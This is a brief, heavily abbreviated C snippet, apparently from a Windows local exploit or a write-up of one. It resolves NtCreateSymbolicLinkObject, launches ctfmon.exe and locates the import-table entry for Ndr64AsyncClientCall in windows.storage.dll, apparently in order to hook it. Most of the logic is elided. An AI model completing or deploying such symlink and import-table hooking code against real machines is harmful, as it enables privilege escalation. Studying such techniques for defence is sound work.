...
VOID main()
{
    ...
    NtCreateSymbolicLinkObject = (int(*)(HANDLE*, int, void*, UNICODE_STRING*)) GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateSymbolicLinkObject");
    ...
    *(unsigned __int64*)(buffer + 0x00) = 0xc0001; // Flags
    ...
    ShellExecuteA(0x0, "open", "ctfmon.exe", "", NULL, 1);
    ...
    Ndr64AsyncClientCall_IAT = (void**)get_iat((char*)GetModuleHandleA("windows.storage.dll"), Ndr64AsyncClientCall);
